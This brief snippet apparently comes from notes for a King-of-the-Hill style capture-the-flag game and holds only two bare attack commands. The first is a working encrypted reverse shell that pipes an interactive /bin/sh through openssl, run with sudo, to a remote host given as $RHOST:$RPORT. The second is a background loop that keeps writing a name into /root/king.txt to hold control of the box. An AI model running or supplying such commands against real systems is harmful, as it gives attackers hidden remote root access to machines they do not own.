```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo /usr/bin/openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
```

`nohup sh -c 'while true; do echo DrAsstrange >> /root/king.txt; sleep 1; done' >/dev/null 2>&1 &`